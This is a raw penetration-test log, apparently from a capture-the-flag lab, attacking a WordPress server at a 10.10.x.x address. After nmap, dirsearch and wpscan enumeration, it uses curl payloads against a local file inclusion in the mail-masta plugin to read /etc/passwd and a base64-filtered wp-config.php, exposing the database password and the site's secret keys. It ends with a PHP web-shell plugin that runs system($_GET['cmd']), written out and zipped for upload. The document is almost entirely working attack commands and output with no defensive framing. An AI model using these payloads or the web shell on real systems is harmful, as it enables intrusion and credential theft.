```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A -T4 10.10.186.115     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 05:40 EDT
Nmap scan report for 10.10.186.115
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.188.43
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 49:49:58:b3:db:a7:3e:c8:d4:1e:82:8e:3e:69:6b:85 (RSA)
|   256 3a:d0:f9:2f:4c:43:a0:11:6f:fd:a4:36:d3:7f:34:a3 (ECDSA)
|_  256 5c:ac:11:df:19:d5:df:e6:a9:b9:7b:4b:4e:96:12:da (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   338.43 ms 10.8.0.1
2   338.80 ms 10.10.186.115

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.20 seconds
```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://10.10.186.115  
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                      
                                                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.10.186.115/_25-10-12_05-47-07.txt

Target: http://10.10.186.115/

[05:47:07] Starting:                                                                                                                                         
[05:47:15] 403 -  278B  - /.ht_wsr.txt                                      
[05:47:15] 403 -  278B  - /.htaccess.bak1                                   
[05:47:15] 403 -  278B  - /.htaccess.orig                                   
[05:47:15] 403 -  278B  - /.htaccess.sample                                 
[05:47:15] 403 -  278B  - /.htaccess.save                                   
[05:47:15] 403 -  278B  - /.htaccess_extra
[05:47:15] 403 -  278B  - /.htaccess_orig
[05:47:15] 403 -  278B  - /.htaccessBAK
[05:47:15] 403 -  278B  - /.htaccess_sc
[05:47:15] 403 -  278B  - /.htaccessOLD2
[05:47:15] 403 -  278B  - /.htaccessOLD                                     
[05:47:15] 403 -  278B  - /.html                                            
[05:47:15] 403 -  278B  - /.htm                                             
[05:47:15] 403 -  278B  - /.htpasswd_test                                   
[05:47:15] 403 -  278B  - /.htpasswds                                       
[05:47:15] 403 -  278B  - /.httr-oauth
[05:47:17] 403 -  278B  - /.php                                             
[05:48:34] 403 -  278B  - /server-status                                    
[05:48:34] 403 -  278B  - /server-status/                                   
[05:48:56] 200 -    2KB - /wordpress/wp-login.php                           
[05:48:57] 200 -    7KB - /wordpress/                                       
                                                                             
Task Completed                                                                                                                                               
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://10.10.186.115/wordpress
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                      
                                                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.10.186.115/_wordpress_25-10-12_05-49-11.txt

Target: http://10.10.186.115/

[05:49:11] Starting: wordpress/                                                                                                                              
[05:49:19] 403 -  278B  - /wordpress/.ht_wsr.txt                            
[05:49:19] 403 -  278B  - /wordpress/.htaccess.bak1                         
[05:49:19] 403 -  278B  - /wordpress/.htaccess.orig
[05:49:19] 403 -  278B  - /wordpress/.htaccess.save                         
[05:49:19] 403 -  278B  - /wordpress/.htaccess.sample                       
[05:49:19] 403 -  278B  - /wordpress/.htaccess_extra                        
[05:49:19] 403 -  278B  - /wordpress/.htaccessOLD2
[05:49:19] 403 -  278B  - /wordpress/.htaccess_orig
[05:49:19] 403 -  278B  - /wordpress/.htaccessBAK
[05:49:19] 403 -  278B  - /wordpress/.htaccessOLD
[05:49:19] 403 -  278B  - /wordpress/.htaccess_sc
[05:49:19] 403 -  278B  - /wordpress/.htm                                   
[05:49:19] 403 -  278B  - /wordpress/.html
[05:49:19] 403 -  278B  - /wordpress/.htpasswd_test                         
[05:49:19] 403 -  278B  - /wordpress/.httr-oauth
[05:49:19] 403 -  278B  - /wordpress/.htpasswds
[05:49:21] 403 -  278B  - /wordpress/.php                                   
[05:50:11] 301 -    0B  - /wordpress/index.php  ->  http://10.10.186.115/wordpress/
[05:50:11] 404 -   23KB - /wordpress/index.php/login/                       
[05:50:15] 200 -    7KB - /wordpress/license.txt                            
[05:50:37] 200 -    3KB - /wordpress/readme.html                            
[05:51:01] 301 -  327B  - /wordpress/wp-admin  ->  http://10.10.186.115/wordpress/wp-admin/
[05:51:01] 302 -    0B  - /wordpress/wp-admin/  ->  http://10.10.186.115/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.10.186.115%2Fwordpress%2Fwp-admin%2F&reauth=1
[05:51:01] 400 -    1B  - /wordpress/wp-admin/admin-ajax.php
[05:51:01] 409 -    3KB - /wordpress/wp-admin/setup-config.php              
[05:51:01] 200 -  516B  - /wordpress/wp-admin/install.php                   
[05:51:01] 200 -    0B  - /wordpress/wp-config.php                          
[05:51:01] 301 -  329B  - /wordpress/wp-content  ->  http://10.10.186.115/wordpress/wp-content/
[05:51:01] 200 -    0B  - /wordpress/wp-content/                            
[05:51:01] 200 -  422B  - /wordpress/wp-content/upgrade/                    
[05:51:01] 200 -  483B  - /wordpress/wp-content/uploads/                    
[05:51:01] 200 -   84B  - /wordpress/wp-content/plugins/akismet/akismet.php 
[05:51:01] 500 -    0B  - /wordpress/wp-content/plugins/hello.php
[05:51:02] 301 -  330B  - /wordpress/wp-includes  ->  http://10.10.186.115/wordpress/wp-includes/
[05:51:02] 500 -    0B  - /wordpress/wp-includes/rss-functions.php          
[05:51:02] 200 -    0B  - /wordpress/wp-cron.php                            
[05:51:02] 200 -    2KB - /wordpress/wp-login.php
[05:51:02] 302 -    0B  - /wordpress/wp-signup.php  ->  http://10.10.186.115/wordpress/wp-login.php?action=register
[05:51:02] 200 -    4KB - /wordpress/wp-includes/                           
[05:51:03] 405 -   42B  - /wordpress/xmlrpc.php                                                     
Task Completed                                                                                    



```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.186.115/wordpress --enumerate u,p,t,dbe
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.186.115/wordpress/ [10.10.186.115]
[+] Started: Sun Oct 12 06:08:17 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.186.115/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.186.115/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.186.115/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.186.115/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.186.115/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.186.115/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.186.115/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.10.186.115/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.186.115/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.186.115/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.186.115/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.186.115/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.186.115/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.186.115/wordpress/wp-content/plugins/reflex-gallery/readme.txt

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:15 <=============================================================================> (400 / 400) 100.00% Time: 00:00:15
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://10.10.186.115/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.10.186.115/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://10.10.186.115/wordpress/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.186.115/wordpress/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 1.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.186.115/wordpress/wp-content/themes/twentynineteen/style.css, Match: 'Version: 1.7'

[+] twentyseventeen
 | Location: http://10.10.186.115/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.10.186.115/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://10.10.186.115/wordpress/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.186.115/wordpress/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.186.115/wordpress/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.4'

[+] twentytwenty
 | Location: http://10.10.186.115/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.10.186.115/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.186.115/wordpress/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://10.10.186.115/wordpress/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.186.115/wordpress/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.5'

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:02 <====================================================================================> (75 / 75) 100.00% Time: 00:00:02

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <===============================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.186.115/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Oct 12 06:08:51 2025
[+] Requests Done: 554
[+] Cached Requests: 17
[+] Data Sent: 155.442 KB
[+] Data Received: 4.024 MB
[+] Memory used: 271.402 MB
[+] Elapsed time: 00:00:34
```
Testing LFI
┌──(kali㉿kali)-[~]
└─$ curl -s "http://10.10.209.153/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash
mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
systemd-timesync:x:113:116:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:114:119:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:115:120::/nonexistent:/usr/sbin/nologin
usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:117:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
                                                                                                                                                             
┌──(kali㉿kali)-[~]


┌──(kali㉿kali)-[~]
└─$ curl -s "http://10.10.209.153/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/mysql/my.cnf"

# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 

Checking wp-config.php file:

┌──(kali㉿kali)-[~]
└─$ curl -s "http://10.10.209.153/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php" | base64 -d 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

wordpress;
define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'zkY%m%RFYb:u,/lq-iZ~8fjENdIaSb=^k<3Zr/0DiLZqPxz|Auqli6lZ-9DRagJP' );
define( 'SECURE_AUTH_KEY',  'iAYak<_&~v9o+{b@RPR62R9 Ty- 6U-yH5baUD{;ndSiC[]qosxS@scu&S)d$H[T' );
define( 'LOGGED_IN_KEY',    'aPd_*sBf=Zuc++a]5Vg9=P~u03Q,zvp[eUe/})D=:NyhUY{KXR]t7}42Upk[r7?s' );
define( 'NONCE_KEY',        '@i;T({xV/fvE!s+^de7e4LX3}NT@ j;b4[z3_fFJbbW(no 3O7F@sx0!oy(O`h#M' );
define( 'AUTH_SALT',        'B AT@i>* N#W<n!*|kFdMnQN)>^=^(iHp8Uvg<~2H~zF]idyQ={@}1}*r{lZ0,WY' );
define( 'SECURE_AUTH_SALT', 'hx8I:+Tz8n335Whmz[>$UZ;8rQYK>Rz]VGyBdmo7=&GZ!LO,pAMs]f!zV}xn:4AP' );
define( 'LOGGED_IN_SALT',   'x7r>|c0ML^s;Sw2*U!x.{`5D:P1}W= /ci{Q<tEM=trSv1eed|_fsL`y^S,XI<RY' );
define( 'NONCE_SALT',       'vOb%Wty}$zx9`|>45Ip@syZ ]G:C3|SdD-P3<{YP:.jPDX)H}wGm1*J^MSbs$1`|' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 

creating a Malicious plugon:

#create a simple plugin with a web shell
mkdir malicious-plugin
echo '<?php
/**
 * Plugin Name: Malicious Shell
 * Version: 1.0
 */
 
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>' > malicious-plugin/malicious-shell.php

#zip the plug
zip -r malicious-plugin.zip malicious-plugin/